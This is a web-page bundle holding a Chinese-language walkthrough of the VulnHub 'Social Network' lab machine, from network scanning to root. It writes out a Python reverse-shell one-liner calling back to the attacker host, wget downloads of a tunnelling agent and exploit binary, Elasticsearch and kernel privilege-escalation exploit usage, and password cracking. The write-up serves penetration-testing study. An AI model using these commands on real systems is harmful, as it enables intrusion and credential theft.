import{_ as n}from"./plugin-vue_export-helper-c27b6911.js";import{r as d,o as c,c as l,a,b as e,d as t,e as s}from"./app-c90a821c.js";const r="/assets/image-20230903003220615-b75425ea.png",p="/assets/image-20230903003306085-93d28cd1.png",o="/assets/image-20230903003735579-a04c4f12.png",m="/assets/image-20230903004223800-dbcaa825.png",g="/assets/image-20230903004519423-e19f64c1.png",u="/assets/image-20230903004751475-0bc2f676.png",v="/assets/image-20230903004855318-82a4062a.png",b="/assets/image-20230903010137821-a7a6816f.png",h="/assets/image-20230903010300612-65fd3512.png",x="/assets/image-20230903010654998-f087fe75.png",_="/assets/image-20230903010837190-6626feed.png",k="/assets/image-20230903011144346-f9b3a99e.png",f="/assets/image-20230903012651179-5e66e903.png",q="/assets/image-20230903012756958-f8b44b38.png",w="/assets/image-20230903013147504-5c842384.png",y="/assets/image-20230903013310276-15c79a9e.png",V="/assets/image-20230903013523908-60375f3f.png",E="/assets/image-20230903014645749-1cfff037.png",B="/assets/image-20230903014858457-ffc80ef4.png",N="/assets/image-20230903015304058-9b62113a.png",I="/assets/image-20230903015616955-143a8ba7.png",P="/assets/image-20230903111333679-7aec2d94.png",S="/assets/image-20230903111535615-8c3450d0.png",T="/assets/image-20230903111919489-2fe7e868.png",U="/assets/image-20230903112045660-8efb7735.png",C="/assets/image-20230903112151678-9a658f48.png",D="/assets/image-20230903112830337-acd2b79c.png",L="/assets/image-20230903113053551-1550f6fc.png",M="/assets/image-20230903113304321-e4bb3e27.png",A="/assets/image-20230903113646671-acebf190.png",H="/assets/image-20230903142533615-cd6856a8.png",j="/assets/image-20230903142738831-055f0354.png",K="/assets/image-20230903143905860-8daedbbe.png",$="/assets/image-20230903144214024-ae84b7b6.png",F="/assets/image-20230903145048715-99d25d06.png",O="/assets/image-20230903145823380-9ba79ff2.png",R="/assets/image-20230903182748494-0679c7d9.png",z="/assets/image-20230903183219231-715df271.png",G="/assets/image-20230903184503957-4550175e.png",J="/assets/image-20230903184613792-5ba99204.png",Q="/assets/image-20230903185049835-38f76331.png",W="/assets/image-20230903200930530-1dbd1a96.png",X="/assets/image-20230903202722548-8d3d776d.png",Y={},Z=s(`<h1 id="靶机下载地址" tabindex="-1"><a class="header-anchor" href="#靶机下载地址" aria-hidden="true">#</a> 靶机下载地址</h1><p>https://download.vulnhub.com/boredhackerblog/medium_socnet.ova</p><h1 id="靶机目标" tabindex="-1"><a class="header-anchor" href="#靶机目标" aria-hidden="true">#</a> 靶机目标</h1><p>获取靶机root权限</p><h1 id="工具准备" tabindex="-1"><a class="header-anchor" href="#工具准备" aria-hidden="true">#</a> 工具准备</h1><ul><li>dirsearch</li><li>Venom下载地址：https://github.com/Dliv3/Venom/</li><li>MD5密码查询网站：https://cmd5.com/</li></ul><h1 id="详细步骤" tabindex="-1"><a class="header-anchor" href="#详细步骤" aria-hidden="true">#</a> 详细步骤</h1><h2 id="网络扫描" tabindex="-1"><a class="header-anchor" href="#网络扫描" aria-hidden="true">#</a> 网络扫描</h2><p>1.同网段主机扫描</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>arp-scan -l -I eth1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="`+r+'" alt="image-20230903003220615"></p><p><img src="'+p+`" alt="image-20230903003306085"></p><blockquote><p>对比MAC地址可知道靶机地址为192.168.56.101</p></blockquote><p>2.直接访问无果，对目标靶机进行全端口扫描</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>nmap -p- 192.168.56.101
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="`+o+`" alt="image-20230903003735579"></p><p>发现开启22与5000端口</p><p>3.识别靶机端口开放的服务</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>nmap -p 22,5000 -sV 192.168.56.101
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="`+m+'" alt="image-20230903004223800"></p><p>初步观察到5000端口的http为python提供服务</p><h2 id="web信息收集" tabindex="-1"><a class="header-anchor" href="#web信息收集" aria-hidden="true">#</a> web信息收集</h2><p>1.浏览器访问192.168.56.101:5000，尝试xss注入，发现并没有什么漏洞</p><p><img src="'+g+`" alt="image-20230903004519423"></p><p>2.对192.168.56.101:5000进行目录扫描</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>dirsearch -u http://192.168.56.101:5000/
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="`+u+'" alt="image-20230903004751475"></p><p>扫描到有一个/admin的目录</p><p>对192.168.56.101:5000/admin进行访问</p><p><img src="'+v+`" alt="image-20230903004855318"></p><p>发现是一个测试代码的页面</p><p>因为指纹收集时，发现是一个python提供的服务，所以预使用python反弹一个shell</p><h2 id="web命令执行漏洞与反弹shell" tabindex="-1"><a class="header-anchor" href="#web命令执行漏洞与反弹shell" aria-hidden="true">#</a> web命令执行漏洞与反弹shell</h2><p>1.首先在kali机上用nc开启一个监听端口</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>nc -lvvp 9999
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,35),ee={href:"https://forum.ywhack.com/shell.php",target:"_blank",rel:"noopener noreferrer"},ae=s(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.56.103&quot;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>192.168.56.103为kali机的IP，9999为刚刚开启的监听端口</p><p><img src="`+b+'" alt="image-20230903010137821"></p><p>获得shell后，<code>ls</code>查看下当前目录</p><p><img src="'+h+`" alt="image-20230903010300612"></p><p>发现有个Dockerfile文件，猜测获取的shell主机可能是docker容器里面的一个靶机，进一步验证主机是否为docker容器</p><p>方法1：确认根目录下是否存在.dockerenv文件</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>ls /.dockerenv
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="`+x+`" alt="image-20230903010654998"></p><p>方法2：查看/proc/1/cgroup是否存在docker目录</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>cat /proc/1/cgroup
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>发现确定为docker容器里面的靶机</p><p>ifconfig查看主机网卡状态</p><p><img src="`+_+`" alt="image-20230903010837190"></p><p>复现主机内网段为172.17.0.3/16网段</p><h2 id="内网穿透" tabindex="-1"><a class="header-anchor" href="#内网穿透" aria-hidden="true">#</a> 内网穿透</h2><p>1.内网扫描</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>for i in $(seq 1 254); do ping -c 1 172.17.0.$i; done
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>写一个简单的shell脚本，帮助我们快速使用ping命令扫描同网段的IP</p><p><img src="`+k+`" alt="image-20230903011144346"></p><p>发现了<code>172.17.0.1</code>，<code>172.17.0.2</code>，<code>172.17.0.3</code>为存活的主机</p><p>为了进一步扫描存活主机的信息，需要使用nmap工具，于是想到搭建内网穿透</p><p>2.部署Venom内网穿透工具</p><blockquote><ul><li>监听的窗口继续开着，另外开一个窗口，在Kali主机Venom目录启动Python3 Http Server，搭建一个临时的http服务，让docker主机下载kali主机的Venom的客户端</li></ul><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python3 -m http.server 80
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="`+f+`" alt="image-20230903012651179"></p><ul><li>启动Venom管理端，监听本地10086端口</li></ul><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>./admin_linux_x64 -lport 10086
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="`+q+`" alt="image-20230903012756958"></p><ul><li>然后再主机（docker）上部署Venom客服端</li></ul><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>cd /tmp
wget -c http://192.168.56.101/agent_linux_x64           //下载客户端
chmod 777 agent_linux_x64								//提升权限
./agent_linux_x64 -rhost 192.168.56.103 -rport 10086	//执行客户端访问目标
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="`+w+'" alt="image-20230903013147504"></p><p>然后会发现kali主机的Venom管理端可以看到有主机上线</p><p><img src="'+y+'" alt="image-20230903013310276"></p><p>查看刚刚连接的节点（<code>show</code>），选择节点（<code>goto 1</code>），启动socks隧道并指定1080为隧道端口（<code>socks 1080</code>）</p><p><img src="'+V+`" alt="image-20230903013523908"></p><p>docker主机与Venom的socks隧道已经建立完成</p><p>现在需要把kali主机挂上Venom的socks隧道代理，让kali能通过docker的流量执行命令</p></blockquote><h2 id="再kali主机挂上socks内网代理并进行扫描" tabindex="-1"><a class="header-anchor" href="#再kali主机挂上socks内网代理并进行扫描" aria-hidden="true">#</a> 再kali主机挂上socks内网代理并进行扫描</h2><p>1.修改proxychains配置（代理文件配置）</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>vi /etc/proxychains.conf
修改最后一行为：
socks5  127.0.0.1 1080
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p><img src="`+E+`" alt="image-20230903014645749"></p></blockquote><p>2.保存好后，挂代理启动扫描，扫描<code>172.17.0.1</code>，<code>172.17.0.2</code>，<code>172.17.0.3</code>主机</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>proxychains nmap -Pn -sT -sV 172.17.0.1
proxychains nmap -Pn -sT -sV 172.17.0.2
proxychains nmap -Pn -sT -sV 172.17.0.3
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="`+B+'" alt="image-20230903014858457"></p><p><img src="'+N+'" alt="image-20230903015304058"></p><blockquote><p>扫描后发现<code>172.17.0.1</code>，<code>172.17.0.3</code>一样，存在22，5000端口，但发现<code>172.17.0.2</code>存在9200端口</p><p>访问一下</p></blockquote><p><img src="'+I+`" alt="image-20230903015616955"></p><h2 id="利用elasticsearch获取目标靶机登录名字和密码" tabindex="-1"><a class="header-anchor" href="#利用elasticsearch获取目标靶机登录名字和密码" aria-hidden="true">#</a> 利用Elasticsearch获取目标靶机登录名字和密码</h2><p>1.搜索Elasticsearch漏洞</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>searchsploit Elasticsearch
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="`+P+`" alt="image-20230903111333679"></p><p>2.把查找到的36337.py复制到当前目录使用</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>cp /usr/share/exploitdb/exploits/linux/remote/36337.py .
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="`+S+`" alt="image-20230903111535615"></p><p>3.挂proxychains攻击目标<code>172.17.0.2</code></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>proxychains python2 36337.py 172..17.0.2
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><blockquote><p>查看脚本发现是python2的脚本，所以用python2运行</p></blockquote><p><img src="`+T+'" alt="image-20230903111919489"></p><p>4.查询用户身份并检查目录</p><p><img src="'+U+'" alt="image-20230903112045660"></p><p>发现用户为root用户，目录下有passwords这种敏感目录，查看</p><p><img src="'+C+'" alt="image-20230903112151678"></p><p>发现内置用户名和密码，密码是加密的</p><p>5.破解密码</p>',51),se={href:"https://www.somd5.com/",target:"_blank",rel:"noopener noreferrer"},ie=s('<p><img src="'+D+`" alt="image-20230903112830337"></p><p>6.使用john用户登录目标靶机</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>ssh john@192.168.56.101
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="`+L+`" alt="image-20230903113053551"></p><blockquote><p>密码输入上面解密出来的<code>1337hack</code></p></blockquote><h2 id="linux内核提权" tabindex="-1"><a class="header-anchor" href="#linux内核提权" aria-hidden="true">#</a> Linux内核提权</h2><p>1.查看用户权限和版本</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>id
uname -a
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="`+M+`" alt="image-20230903113304321"></p><blockquote><p>发现权限为普通用户权限，版本为Ubuntu 3.13.0</p></blockquote><p>2.搜索版本漏洞</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>searchsploit Linux 3.13
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="`+A+`" alt="image-20230903113646671"></p><p>找到对应版本的脚本<code>37292.c</code>，复制到桌面目录方便使用</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>cp /usr/share/exploitdb/exploits/linux/local/37292.c .
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="`+H+'" alt="image-20230903142533615"></p><p>注意：因为之前尝试编译过报错，且发送给靶机提权失败，所以需要改动文件</p><p><img src="'+j+'" alt="image-20230903142738831"></p><p>需要把<code>37292.c</code>里面的这些代码给注释掉，且需把它用Ubuntu编译，再发送给靶机</p><p>查看<code>37292.c</code>文件也得知需要有一个<code>ofs-lib.so</code>库文件</p><p><img src="'+K+`" alt="image-20230903143905860"></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>locate ofs-lib.so
cp /usr/share/metasploit-framework/data/exploits/CVE-2015-1328/ofs-lib.so .
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="`+$+`" alt="image-20230903144214024"></p><p>3.kali主机内的docker下载Ubuntu靶机编译文件</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker search ubuntu14
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="`+F+`" alt="image-20230903145048715"></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker pull ansible/ubuntu14.04-ansible
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="`+O+`" alt="image-20230903145823380"></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker run -it --name ubuntu14 ansible/ubuntu14.04-ansible
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="`+R+`" alt="image-20230903182748494"></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>apt update
apt-get install wget
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>然后更新好apt，安装wget</p><p>启动好系统（Ubuntu）后，kali开启临时http服务，让系统（Ubuntu）下载</p><p><img src="`+z+'" alt="image-20230903183219231"></p><p><img src="'+G+`" alt="image-20230903184503957"></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>gcc -o exp 37292.c
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>编译文件</p><p><img src="`+J+`" alt="image-20230903184613792"></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker cp ubuntu14:/exp .
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>然后把docker里面的文件复制出来</p><p><img src="`+Q+`" alt="image-20230903185049835"></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python3 -m http.server 100
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><blockquote><p>开启100端口的http服务</p></blockquote><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>wget -c http://192.168.56.103:100/exp
wget -c http://192.168.56.103:100/ofs-lib.so
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="`+W+`" alt="image-20230903200930530"></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>mv exp tmp
mv ofs-lib.so tmp
chmod +x exp
./exp
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>移动至tmp目录下，并给予权限，再执行，则提权成功！</p><p><img src="`+X+'" alt="image-20230903202722548"></p>',48);function te(ne,de){const i=d("ExternalLinkIcon");return c(),l("div",null,[Z,a("p",null,[e("2.在"),a("a",ee,[e("棱角社区"),t(i)]),e("找到一个python的反弹shell命令")]),ae,a("p",null,[e("使用"),a("a",se,[e("MD5在线解密"),t(i)])]),ie])}const re=n(Y,[["render",te],["__file","01vulnhub-BoredHackerBlog-Social-Network.html.vue"]]);export{re as default};